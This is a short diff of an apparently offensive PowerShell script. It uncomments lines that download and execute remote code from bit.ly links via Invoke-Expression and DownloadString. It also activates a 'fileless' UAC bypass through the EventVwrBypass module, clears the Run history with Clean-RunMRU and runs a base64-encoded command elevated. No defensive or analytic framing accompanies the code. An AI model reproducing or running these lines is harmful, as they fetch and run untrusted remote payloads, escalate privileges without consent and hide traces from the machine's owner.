@@ -6,8 +6,8 @@ param (
 	################################################
 	)
 	
-	#Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2bWu5ef')
-	#Clean-RunMRU -Last
+	Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2bWu5ef')
+	Clean-RunMRU -Last
 	
 	$Command = "
 	# Import Paste.ee API module
@@ -23,7 +23,7 @@ param (
 
 	## Fileless bypass uac
 	# Import EventVwrBypass module
-	# Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2bKS5oM')
+	 Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2bKS5oM')
 	# Execute bypass w/encoded command
 	Invoke-EventVwrBypass -Command ('Powershell -EncodedCommand ' + $([Convert]::ToBase64String($([System.Text.Encoding]::Unicode.GetBytes($Command))))) -Force
 }
